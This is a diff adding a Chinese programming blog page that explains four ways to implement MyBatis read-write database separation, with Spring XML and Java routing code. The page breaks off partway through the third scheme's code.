@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>mybatis读写分离 - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="mybatis读写分离" />
+<meta property="og:description" content="mybatis读写分离实现方式有很多种，当然如果没有太过复杂的处理，可以使用阿里云数据库自带的读写分离连接，那样会更加简洁。本文主要对mybatis实现读写分离。主要的实现方式有一下四种：
+方案1 通过MyBatis配置文件创建读写分离两个DataSource，每个SqlSessionFactoryBean对象的mapperLocations属性制定两个读写数据源的配置文件。将所有读的操作配置在读文件中，所有写的操作配置在写文件中。
+优点：实现简单
+缺点：维护麻烦，需要对原有的xml文件进行重新修改，不支持多读，不易扩展
+&lt;bean id=&#34;abstractDataSource&#34; abstract=&#34;true&#34; class=&#34;com.alibaba.druid.pool.DruidDataSource&#34; init-method=&#34;init&#34; destroy-method=&#34;close&#34;&gt; &lt;property name=&#34;driverClassName&#34; value=&#34;com.microsoft.sqlserver.jdbc.SQLServerDriver&#34;/&gt; &lt;!-- 配置获取连接等待超时的时间 --&gt; &lt;property name=&#34;maxWait&#34; value=&#34;60000&#34;/&gt; &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt; &lt;property name=&#34;timeBetweenEvictionRunsMillis&#34; value=&#34;60000&#34;/&gt; &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt; &lt;property name=&#34;minEvictableIdleTimeMillis&#34; value=&#34;300000&#34;/&gt; &lt;property name=&#34;validationQuery&#34; value=&#34;SELECT &#39;x&#39;&#34;/&gt; &lt;property name=&#34;testWhileIdle&#34; value=&#34;true&#34;/&gt; &lt;property name=&#34;testOnBorrow&#34; value=&#34;false&#34;/&gt; &lt;property name=&#34;testOnReturn&#34; value=&#34;false&#34;/&gt; &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt; &lt;property name=&#34;poolPreparedStatements&#34; value=&#34;true&#34;/&gt; &lt;property name=&#34;maxPoolPreparedStatementPerConnectionSize&#34; value=&#34;20&#34;/&gt; &lt;property name=&#34;filters&#34; value=&#34;config&#34;/&gt; &lt;property name=&#34;connectionProperties&#34; value=&#34;config.decrypt=true&#34; /&gt; &lt;/bean&gt; &lt;bean id=&#34;readDataSource&#34; parent=&#34;abstractDataSource&#34;&gt; &lt;!-- 基本属性 url、user、password --&gt; &lt;property name=&#34;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/da3cffee105e3f49010e78b60c93fe53/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-01-10T11:23:01+08:00" />
+<meta property="article:modified_time" content="2019-01-10T11:23:01+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">mybatis读写分离</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p>mybatis读写分离实现方式有很多种，当然如果没有太过复杂的处理，可以使用阿里云数据库自带的读写分离连接，那样会更加简洁。本文主要对mybatis实现读写分离。主要的实现方式有一下四种：</p> 
+<h3>方案1</h3> 
+<p>通过MyBatis配置文件创建读写分离两个DataSource，每个SqlSessionFactoryBean对象的mapperLocations属性制定两个读写数据源的配置文件。将所有读的操作配置在读文件中，所有写的操作配置在写文件中。</p> 
+<p><strong>优点：</strong>实现简单</p> 
+<p><strong>缺点：</strong>维护麻烦，需要对原有的xml文件进行重新修改，不支持多读，不易扩展</p> 
+<pre class="has"><code class="language-java">&lt;bean id="abstractDataSource" abstract="true" class="com.alibaba.druid.pool.DruidDataSource" init-method="init"
+ destroy-method="close"&gt;
+ &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+ &lt;!-- 配置获取连接等待超时的时间 --&gt;
+ &lt;property name="maxWait" value="60000"/&gt;
+ &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt;
+ &lt;property name="timeBetweenEvictionRunsMillis" value="60000"/&gt;
+ &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt;
+ &lt;property name="minEvictableIdleTimeMillis" value="300000"/&gt;
+ &lt;property name="validationQuery" value="SELECT 'x'"/&gt;
+ &lt;property name="testWhileIdle" value="true"/&gt;
+ &lt;property name="testOnBorrow" value="false"/&gt;
+ &lt;property name="testOnReturn" value="false"/&gt;
+ &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt;
+ &lt;property name="poolPreparedStatements" value="true"/&gt;
+ &lt;property name="maxPoolPreparedStatementPerConnectionSize" value="20"/&gt;
+ &lt;property name="filters" value="config"/&gt;
+ &lt;property name="connectionProperties" value="config.decrypt=true" /&gt;
+&lt;/bean&gt;
+&lt;bean id="readDataSource" parent="abstractDataSource"&gt;
+ &lt;!-- 基本属性 url、user、password --&gt;
+ &lt;property name="url" value="${read.jdbc.url}"/&gt;
+ &lt;property name="username" value="${read.jdbc.user}"/&gt;
+ &lt;property name="password" value="${read.jdbc.password}"/&gt;
+ &lt;!-- 配置初始化大小、最小、最大 --&gt;
+ &lt;property name="initialSize" value="${read.jdbc.initPoolSize}"/&gt;
+ &lt;property name="minIdle" value="10"/&gt;
+ &lt;property name="maxActive" value="${read.jdbc.maxPoolSize}"/&gt;
+&lt;/bean&gt;
+&lt;bean id="writeDataSource" parent="abstractDataSource"&gt;
+ &lt;!-- 基本属性 url、user、password --&gt;
+ &lt;property name="url" value="${write.jdbc.url}"/&gt;
+ &lt;property name="username" value="${write.jdbc.user}"/&gt;
+ &lt;property name="password" value="${write.jdbc.password}"/&gt;
+ &lt;!-- 配置初始化大小、最小、最大 --&gt;
+ &lt;property name="initialSize" value="${write.jdbc.initPoolSize}"/&gt;
+ &lt;property name="minIdle" value="10"/&gt;
+ &lt;property name="maxActive" value="${write.jdbc.maxPoolSize}"/&gt;
+&lt;/bean&gt;
+&lt;bean id="readSqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt;
+ &lt;!-- 实例化sqlSessionFactory时需要使用上述配置好的数据源以及SQL映射文件 --&gt;
+ &lt;property name="dataSource" ref="readDataSource"/&gt;
+ &lt;property name="mapperLocations" value="classpath:mapper/read/*.xml"/&gt;
+&lt;/bean&gt;
+&lt;bean id="writeSqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt;
+ &lt;!-- 实例化sqlSessionFactory时需要使用上述配置好的数据源以及SQL映射文件 --&gt;
+ &lt;property name="dataSource" ref="writeDataSource"/&gt;
+ &lt;property name="mapperLocations" value="classpath:mapper/write/*.xml"/&gt;
+&lt;/bean&gt;</code></pre> 
+<h3>方案2</h3> 
+<p>通过Spring AOP在业务层实现读写分离，在DAO层调用前定义切面，利用Spring的AbstractRoutingDataSource解决多数据源的问题，实现动态选择数据源</p> 
+<p><strong>优点：</strong>通过注解的方法在DAO每个方法上配置数据源，原有代码改动量少，易扩展，支持多读</p> 
+<p><strong>缺点：</strong>需要在DAO每个方法上配置注解，人工管理，容易出错</p> 
+<pre class="has"><code class="language-java">//定义枚举类型，读写
+public enum DynamicDataSourceGlobal {
+ READ, WRITE;
+}</code></pre> 
+<pre class="has"><code class="language-java">import java.lang.annotation.ElementType;
+import java.lang.annotation.Retention;
+import java.lang.annotation.RetentionPolicy;
+import java.lang.annotation.Target;
+/**
+ * RUNTIME
+ * 定义注解
+ * 编译器将把注释记录在类文件中，在运行时 VM 将保留注释，因此可以反射性地读取。
+ * @author shma1664
+ *
+ */
+@Retention(RetentionPolicy.RUNTIME)
+@Target(ElementType.METHOD)
+public @interface DataSource {
+ public DynamicDataSourceGlobal value() default DynamicDataSourceGlobal.READ;
+}</code></pre> 
+<pre class="has"><code class="language-java">/**
+ * Created by IDEA
+ * 本地线程设置和获取数据源信息
+ * User: mashaohua
+ * Date: 2016-07-07 13:35
+ * Desc:
+ */
+public class DynamicDataSourceHolder {
+ private static final ThreadLocal&lt;DynamicDataSourceGlobal&gt; holder = new ThreadLocal&lt;DynamicDataSourceGlobal&gt;();
+ public static void putDataSource(DynamicDataSourceGlobal dataSource){
+ holder.set(dataSource);
+ }
+ public static DynamicDataSourceGlobal getDataSource(){
+ return holder.get();
+ }
+ public static void clearDataSource() {
+ holder.remove();
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.concurrent.ThreadLocalRandom;
+import java.util.concurrent.atomic.AtomicLong;
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
+/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-14 10:56
+ * Desc: 动态数据源实现读写分离
+ */
+public class DynamicDataSource extends AbstractRoutingDataSource {
+ private Object writeDataSource; //写数据源
+ private List&lt;Object&gt; readDataSources; //多个读数据源
+ private int readDataSourceSize; //读数据源个数
+ private int readDataSourcePollPattern = 0; //获取读数据源方式，0：随机，1：轮询
+ private AtomicLong counter = new AtomicLong(0);
+ private static final Long MAX_POOL = Long.MAX_VALUE;
+ private final Lock lock = new ReentrantLock();
+ @Override
+ public void afterPropertiesSet() {
+ if (this.writeDataSource == null) {
+  throw new IllegalArgumentException("Property 'writeDataSource' is required");
+ }
+ setDefaultTargetDataSource(writeDataSource);
+ Map&lt;Object, Object&gt; targetDataSources = new HashMap&lt;&gt;();
+ targetDataSources.put(DynamicDataSourceGlobal.WRITE.name(), writeDataSource);
+ if (this.readDataSources == null) {
+  readDataSourceSize = 0;
+ } else {
+  for(int i=0; i&lt;readDataSources.size(); i++) {
+  targetDataSources.put(DynamicDataSourceGlobal.READ.name() + i, readDataSources.get(i));
+  }
+  readDataSourceSize = readDataSources.size();
+ }
+ setTargetDataSources(targetDataSources);
+ super.afterPropertiesSet();
+ }
+ @Override
+ protected Object determineCurrentLookupKey() {
+ DynamicDataSourceGlobal dynamicDataSourceGlobal = DynamicDataSourceHolder.getDataSource();
+ if(dynamicDataSourceGlobal == null
+  || dynamicDataSourceGlobal == DynamicDataSourceGlobal.WRITE
+  || readDataSourceSize &lt;= 0) {
+  return DynamicDataSourceGlobal.WRITE.name();
+ }
+ int index = 1;
+ if(readDataSourcePollPattern == 1) {
+  //轮询方式
+  long currValue = counter.incrementAndGet();
+  if((currValue + 1) &gt;= MAX_POOL) {
+  try {
+   lock.lock();
+   if((currValue + 1) &gt;= MAX_POOL) {
+   counter.set(0);
+   }
+  } finally {
+   lock.unlock();
+  }
+  }
+  index = (int) (currValue % readDataSourceSize);
+ } else {
+  //随机方式
+  index = ThreadLocalRandom.current().nextInt(0, readDataSourceSize);
+ }
+ return dynamicDataSourceGlobal.name() + index;
+ }
+ public void setWriteDataSource(Object writeDataSource) {
+ this.writeDataSource = writeDataSource;
+ }
+ public void setReadDataSources(List&lt;Object&gt; readDataSources) {
+ this.readDataSources = readDataSources;
+ }
+ public void setReadDataSourcePollPattern(int readDataSourcePollPattern) {
+ this.readDataSourcePollPattern = readDataSourcePollPattern;
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import org.apache.log4j.Logger;
+import org.aspectj.lang.JoinPoint;
+import org.aspectj.lang.reflect.MethodSignature;
+import java.lang.reflect.Method;
+/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-07 13:39
+ * Desc: 定义选择数据源切面
+ */
+public class DynamicDataSourceAspect {
+ private static final Logger logger = Logger.getLogger(DynamicDataSourceAspect.class);
+ public void pointCut(){};
+ public void before(JoinPoint point)
+ {
+ Object target = point.getTarget();
+ String methodName = point.getSignature().getName();
+ Class&lt;?&gt;[] clazz = target.getClass().getInterfaces();
+ Class&lt;?&gt;[] parameterTypes = ((MethodSignature) point.getSignature()).getMethod().getParameterTypes();
+ try {
+  Method method = clazz[0].getMethod(methodName, parameterTypes);
+  if (method != null &amp;&amp; method.isAnnotationPresent(DataSource.class)) {
+  DataSource data = method.getAnnotation(DataSource.class);
+  DynamicDataSourceHolder.putDataSource(data.value());
+  }
+ } catch (Exception e) {
+  logger.error(String.format("Choose DataSource error, method:%s, msg:%s", methodName, e.getMessage()));
+ }
+ }
+ public void after(JoinPoint point) {
+ DynamicDataSourceHolder.clearDataSource();
+ }
+}</code></pre> 
+<pre class="has"><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:tx="http://www.springframework.org/schema/tx"
+xmlns:aop="http://www.springframework.org/schema/aop"
+xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd
+http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.1.xsd
+http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd"&gt;
+ &lt;bean id="abstractDataSource" abstract="true" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt;
+ &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+ &lt;!-- 配置获取连接等待超时的时间 --&gt;
+ &lt;property name="maxWait" value="60000"/&gt;
+ &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt;
+ &lt;property name="timeBetweenEvictionRunsMillis" value="60000"/&gt;
+ &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt;
+ &lt;property name="minEvictableIdleTimeMillis" value="300000"/&gt;
+ &lt;property name="validationQuery" value="SELECT 'x'"/&gt;
+ &lt;property name="testWhileIdle" value="true"/&gt;
+ &lt;property name="testOnBorrow" value="false"/&gt;
+ &lt;property name="testOnReturn" value="false"/&gt;
+ &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt;
+ &lt;property name="poolPreparedStatements" value="true"/&gt;
+ &lt;property name="maxPoolPreparedStatementPerConnectionSize" value="20"/&gt;
+ &lt;property name="filters" value="config"/&gt;
+ &lt;property name="connectionProperties" value="config.decrypt=true" /&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceRead1" parent="abstractDataSource"&gt;
+ &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+ &lt;!-- 基本属性 url、user、password --&gt;
+ &lt;property name="url" value="${read1.jdbc.url}"/&gt;
+ &lt;property name="username" value="${read1.jdbc.user}"/&gt;
+ &lt;property name="password" value="${read1.jdbc.password}"/&gt;
+ &lt;!-- 配置初始化大小、最小、最大 --&gt;
+ &lt;property name="initialSize" value="${read1.jdbc.initPoolSize}"/&gt;
+ &lt;property name="minIdle" value="${read1.jdbc.minPoolSize}"/&gt;
+ &lt;property name="maxActive" value="${read1.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceRead2" parent="abstractDataSource"&gt;
+ &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+ &lt;!-- 基本属性 url、user、password --&gt;
+ &lt;property name="url" value="${read2.jdbc.url}"/&gt;
+ &lt;property name="username" value="${read2.jdbc.user}"/&gt;
+ &lt;property name="password" value="${read2.jdbc.password}"/&gt;
+ &lt;!-- 配置初始化大小、最小、最大 --&gt;
+ &lt;property name="initialSize" value="${read2.jdbc.initPoolSize}"/&gt;
+ &lt;property name="minIdle" value="${read2.jdbc.minPoolSize}"/&gt;
+ &lt;property name="maxActive" value="${read2.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceWrite" parent="abstractDataSource"&gt;
+ &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+ &lt;!-- 基本属性 url、user、password --&gt;
+ &lt;property name="url" value="${write.jdbc.url}"/&gt;
+ &lt;property name="username" value="${write.jdbc.user}"/&gt;
+ &lt;property name="password" value="${write.jdbc.password}"/&gt;
+ &lt;!-- 配置初始化大小、最小、最大 --&gt;
+ &lt;property name="initialSize" value="${write.jdbc.initPoolSize}"/&gt;
+ &lt;property name="minIdle" value="${write.jdbc.minPoolSize}"/&gt;
+ &lt;property name="maxActive" value="${write.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSource" class="com.test.api.dao.datasource.DynamicDataSource"&gt;
+ &lt;property name="writeDataSource" ref="dataSourceWrite" /&gt;
+ &lt;property name="readDataSources"&gt;
+  &lt;list&gt;
+  &lt;ref bean="dataSourceRead1" /&gt;
+  &lt;ref bean="dataSourceRead2" /&gt;
+  &lt;/list&gt;
+ &lt;/property&gt;
+ &lt;!--轮询方式--&gt;
+ &lt;property name="readDataSourcePollPattern" value="1" /&gt;
+ &lt;property name="defaultTargetDataSource" ref="dataSourceWrite"/&gt;
+ &lt;/bean&gt;
+ &lt;tx:annotation-driven transaction-manager="transactionManager"/&gt;
+ &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt;
+ &lt;property name="dataSource" ref="dataSource"/&gt;
+ &lt;/bean&gt;
+ &lt;!-- 针对myBatis的配置项 --&gt;
+ &lt;!-- 配置sqlSessionFactory --&gt;
+ &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt;
+ &lt;!-- 实例化sqlSessionFactory时需要使用上述配置好的数据源以及SQL映射文件 --&gt;
+ &lt;property name="dataSource" ref="dataSource"/&gt;
+ &lt;property name="mapperLocations" value="classpath:mapper/*.xml"/&gt;
+ &lt;/bean&gt;
+ &lt;!-- 配置扫描器 --&gt;
+ &lt;bean class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt;
+ &lt;!-- 扫描包以及它的子包下的所有映射接口类 --&gt;
+ &lt;property name="basePackage" value="com.test.api.dao.inte"/&gt;
+ &lt;property name="sqlSessionFactoryBeanName" value="sqlSessionFactory"/&gt;
+ &lt;/bean&gt;
+ &lt;!-- 配置数据库注解aop --&gt;
+ &lt;bean id="dynamicDataSourceAspect" class="com.test.api.dao.datasource.DynamicDataSourceAspect" /&gt;
+ &lt;aop:config&gt;
+ &lt;aop:aspect id="c" ref="dynamicDataSourceAspect"&gt;
+  &lt;aop:pointcut id="tx" expression="execution(* com.test.api.dao.inte..*.*(..))"/&gt;
+  &lt;aop:before pointcut-ref="tx" method="before"/&gt;
+  &lt;aop:after pointcut-ref="tx" method="after"/&gt;
+ &lt;/aop:aspect&gt;
+ &lt;/aop:config&gt;
+ &lt;!-- 配置数据库注解aop --&gt;
+&lt;/beans&gt;</code></pre> 
+<h3>方案3</h3> 
+<p>通过Mybatis的Plugin在业务层实现数据库读写分离，在MyBatis创建Statement对象前通过拦截器选择真正的数据源，在拦截器中根据方法名称不同（select、update、insert、delete）选择数据源。</p> 
+<p><strong>优点：</strong>原有代码不变，支持多读，易扩展</p> 
+<pre class="has"><code class="language-java">/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-19 15:40
+ * Desc: 创建Connection代理接口
+ */
+public interface ConnectionProxy extends Connection {
+ /**
+ * 根据传入的读写分离需要的key路由到正确的connection
+ * @param key 数据源标识
+ * @return
+ */
+ Connection getTargetConnection(String key);
+}</code></pre> 
+<pre class="has"><code class="language-java">import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.sql.Connection;
+import java.sql.SQLException;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.logging.Logger;
+import javax.sql.DataSource;
+import org.springframework.beans.factory.InitializingBean;
+import org.springframework.jdbc.datasource.AbstractDataSource;
+import org.springframework.jdbc.datasource.lookup.DataSourceLookup;
+import org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup;
+import org.springframework.util.Assert;
+public abstract class AbstractDynamicDataSourceProxy extends AbstractDataSource implements InitializingBean {
+ private List&lt;Object&gt; readDataSources;
+ private List&lt;DataSource&gt; resolvedReadDataSources;
+ private Object writeDataSource;
+ private DataSource resolvedWriteDataSource;
+ private int readDataSourcePollPattern = 0;
+ private int readDsSize;
+ private boolean defaultAutoCommit = true;
+ private int defaultTransactionIsolation = Connection.TRANSACTION_READ_COMMITTED;
+ public static final String READ = "read";
+ public static final String WRITE = "write";
+ private DataSourceLookup dataSourceLookup = new JndiDataSourceLookup();
+ @Override
+ public Connection getConnection() throws SQLException {
+ return (Connection) Proxy.newProxyInstance(
+com.autohome.api.dealer.tuan.dao.rwmybatis.ConnectionProxy.class.getClassLoader(),
+  new Class[] {com.autohome.api.dealer.tuan.dao.rwmybatis.ConnectionProxy.class},
+  new RWConnectionInvocationHandler());
+ }
+ @Override
+ public Connection getConnection(String username, String password)
+  throws SQLException {
+ return (Connection) Proxy.newProxyInstance( com.autohome.api.dealer.tuan.dao.rwmybatis.ConnectionProxy.class.getClassLoader(),
+  new Class[] {com.autohome.api.dealer.tuan.dao.rwmybatis.ConnectionProxy.class},
+  new RWConnectionInvocationHandler(username,password));
+ }
+ public int getReadDsSize(){
+ return readDsSize;
+ }
+ public List&lt;DataSource&gt; getResolvedReadDataSources() {
+ return resolvedReadDataSources;
+ }
+ public void afterPropertiesSet() throws Exception {
+ if(writeDataSource == null){
+  throw new IllegalArgumentException("Property 'writeDataSource' is required");
+ }
+ this.resolvedWriteDataSource = resolveSpecifiedDataSource(writeDataSource);
+ resolvedReadDataSources = new ArrayList&lt;DataSource&gt;(readDataSources.size());
+ for(Object item : readDataSources){
+  resolvedReadDataSources.add(resolveSpecifiedDataSource(item));
+ }
+ readDsSize = readDataSources.size();
+ }
+ protected DataSource determineTargetDataSource(String key) {
+ Assert.notNull(this.resolvedReadDataSources, "DataSource router not initialized");
+ if(WRITE.equals(key)){
+  return resolvedWriteDataSource;
+ }else{
+  return loadReadDataSource();
+ }
+ }
+ public Logger getParentLogger() {
+ // NOOP Just ignore
+ return null;
+ }
+ /**
+ * 获取真实的data source
+ * @param dataSource (jndi | real data source)
+ * @return
+ * @throws IllegalArgumentException
+ */
+ protected DataSource resolveSpecifiedDataSource(Object dataSource) throws IllegalArgumentException {
+ if (dataSource instanceof DataSource) {
+  return (DataSource) dataSource;
+ }
+ else if (dataSource instanceof String) {
+  return this.dataSourceLookup.getDataSource((String) dataSource);
+ }
+ else {
+  throw new IllegalArgumentException(
+   "Illegal data source value - only [javax.sql.DataSource] and String supported: " + dataSource);
+ }
+ }
+ protected abstract DataSource loadReadDataSource();
+ public void setReadDsSize(int readDsSize) {
+ this.readDsSize = readDsSize;
+ }
+ public List&lt;Object&gt; getReadDataSources() {
+ return readDataSources;
+ }
+ public void setReadDataSources(List&lt;Object&gt; readDataSources) {
+ this.readDataSources = readDataSources;
+ }
+ public Object getWriteDataSource() {
+ return writeDataSource;
+ }
+ public void setWriteDataSource(Object writeDataSource) {
+ this.writeDataSource = writeDataSource;
+ }
+ public void setResolvedReadDataSources(List&lt;DataSource&gt; resolvedReadDataSources) {
+ this.resolvedReadDataSources = resolvedReadDataSources;
+ }
+ public DataSource getResolvedWriteDataSource() {
+ return resolvedWriteDataSource;
+ }
+ public void setResolvedWriteDataSource(DataSource resolvedWriteDataSource) {
+ this.resolvedWriteDataSource = resolvedWriteDataSource;
+ }
+ public int getReadDataSourcePollPattern() {
+ return readDataSourcePollPattern;
+ }
+ public void setReadDataSourcePollPattern(int readDataSourcePollPattern) {
+ this.readDataSourcePollPattern = readDataSourcePollPattern;
+ }
+ /**
+ * Invocation handler that defers fetching an actual JDBC Connection
+ * until first creation of a Statement.
+ */
+ private class RWConnectionInvocationHandler implements InvocationHandler {
+ private String username;
+ private String password;
+ private Boolean readOnly = Boolean.FALSE;
+ private Integer transactionIsolation;
+ private Boolean autoCommit;
+ private boolean closed = false;
+ private Connection target;
+ public RWConnectionInvocationHandler() {
+ }
+ public RWConnectionInvocationHandler(String username, String password) {
+  this();
+  this.username = username;
+  this.password = password;
+ }
+ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+  // Invocation on ConnectionProxy interface coming in...
+  if (method.getName().equals("equals")) {
+  // We must avoid fetching a target Connection for "equals".
+  // Only consider equal when proxies are identical.
+  return (proxy == args[0] ? Boolean.TRUE : Boolean.FALSE);
+  }
+  else if (method.getName().equals("hashCode")) {
+  // We must avoid fetching a target Connection for "hashCode",
+  // and we must return the same hash code even when the target
+  // Connection has been fetched: use hashCode of Connection proxy.
+  return new Integer(System.identityHashCode(proxy));
+  }
+  else if (method.getName().equals("getTargetConnection")) {
+  // Handle getTargetConnection method: return underlying connection.
+  return getTargetConnection(method,args);
+  }
+  if (!hasTargetConnection()) {
+  // No physical target Connection kept yet -&gt;
+  // resolve transaction demarcation methods without fetching
+  // a physical JDBC Connection until absolutely necessary.
+  if (method.getName().equals("toString")) {
+   return "RW Routing DataSource Proxy";
+  }
+  else if (method.getName().equals("isReadOnly")) {
+   return this.readOnly;
+  }
+  else if (method.getName().equals("setReadOnly")) {
+   this.readOnly = (Boolean) args[0];
+   return null;
+  }
+  else if (method.getName().equals("getTransactionIsolation")) {
+   if (this.transactionIsolation != null) {
+   return this.transactionIsolation;
+   }
+   return defaultTransactionIsolation;
+   // Else fetch actual Connection and check there,
+   // because we didn't have a default specified.
+  }
+  else if (method.getName().equals("setTransactionIsolation")) {
+   this.transactionIsolation = (Integer) args[0];
+   return null;
+  }
+  else if (method.getName().equals("getAutoCommit")) {
+   if (this.autoCommit != null)
+   return this.autoCommit;
+   return defaultAutoCommit;
+   // Else fetch actual Connection and check there,
+   // because we didn't have a default specified.
+  }
+  else if (method.getName().equals("setAutoCommit")) {
+   this.autoCommit = (Boolean) args[0];
+   return null;
+  }
+  else if (method.getName().equals("commit")) {
+   // Ignore: no statements created yet.
+   return null;
+  }
+  else if (method.getName().equals("rollback")) {
+   // Ignore: no statements created yet.
+   return null;
+  }
+  else if (method.getName().equals("getWarnings")) {
+   return null;
+  }
+  else if (method.getName().equals("clearWarnings")) {
+   return null;
+  }
+  else if (method.getName().equals("isClosed")) {
+   return (this.closed ? Boolean.TRUE : Boolean.FALSE);
+  }
+  else if (method.getName().equals("close")) {
+   // Ignore: no target connection yet.
+   this.closed = true;
+   return null;
+  }
+  else if (this.closed) {
+   // Connection proxy closed, without ever having fetched a
+   // physical JDBC Connection: throw corresponding SQLException.
+   throw new SQLException("Illegal operation: connection is closed");
+  }
+  }
+  // Target Connection already fetched,
+  // or target Connection necessary for current operation -&gt;
+  // invoke method on target connection.
+  try {
+  return method.invoke(target, args);
+  }
+  catch (InvocationTargetException ex) {
+  throw ex.getTargetException();
+  }
+ }
+ /**
+  * Return whether the proxy currently holds a target Connection.
+  */
+ private boolean hasTargetConnection() {
+  return (this.target != null);
+ }
+ /**
+  * Return the target Connection, fetching it and initializing it if necessary.
+  */
+ private Connection getTargetConnection(Method operation,Object[] args) throws SQLException {
+  if (this.target == null) {
+  String key = (String) args[0];
+  // No target Connection held -&gt; fetch one.
+  if (logger.isDebugEnabled()) {
+   logger.debug("Connecting to database for operation '" + operation.getName() + "'");
+  }
+  // Fetch physical Connection from DataSource.
+  this.target = (this.username != null) ?
+   determineTargetDataSource(key).getConnection(this.username, this.password) :
+   determineTargetDataSource(key).getConnection();
+  // If we still lack default connection properties, check them now.
+  //checkDefaultConnectionProperties(this.target);
+  // Apply kept transaction settings, if any.
+  if (this.readOnly.booleanValue()) {
+   this.target.setReadOnly(this.readOnly.booleanValue());
+  }
+  if (this.transactionIsolation != null) {
+this.target.setTransactionIsolation(this.transactionIsolation.intValue());
+  }
+  if (this.autoCommit != null &amp;&amp; this.autoCommit.booleanValue() != this.target.getAutoCommit()) {
+   this.target.setAutoCommit(this.autoCommit.booleanValue());
+  }
+  }
+  else {
+  // Target Connection already held -&gt; return it.
+  if (logger.isDebugEnabled()) {
+   logger.debug("Using existing database connection for operation '" + operation.getName() + "'");
+  }
+  }
+  return this.target;
+ }
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import javax.sql.DataSource;
+import java.util.concurrent.ThreadLocalRandom;
+import java.util.concurrent.atomic.AtomicLong;
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
+/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-19 16:04
+ * Desc:
+ */
+public class DynamicRoutingDataSourceProxy extends AbstractDynamicDataSourceProxy {
+ private AtomicLong counter = new AtomicLong(0);
+ private static final Long MAX_POOL = Long.MAX_VALUE;
+ private final Lock lock = new ReentrantLock();
+ @Override
+ protected DataSource loadReadDataSource() {
+ int index = 1;
+ if(getReadDataSourcePollPattern() == 1) {
+  //轮询方式
+  long currValue = counter.incrementAndGet();
